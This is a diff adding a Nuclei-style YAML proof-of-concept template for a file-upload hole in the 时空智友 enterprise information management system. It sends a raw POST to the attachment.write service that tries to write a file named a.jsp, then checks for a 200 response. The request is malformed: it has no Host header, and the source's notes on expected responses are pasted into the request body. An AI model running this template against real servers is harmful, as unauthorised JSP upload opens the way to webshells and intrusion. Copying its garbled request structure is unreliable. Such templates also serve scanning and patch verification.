@@ -1,0 +1,57 @@
+id: poc-vtcexd5k6977tvv4
+info:
+  name: 时空智友企业信息管理系统文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vtcexd5k6977tvv4'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vtcexd5k6977tvv4
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /formservice?service=attachment.write&isattach=false&filename=a.jsp HTTP/1.1
+
+
+    Cache-Control: max-age=0
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+
+    Accept-Encoding: gzip, deflate, br
+
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    Connection: close
+
+
+
+
+    124124
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    .jsp
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
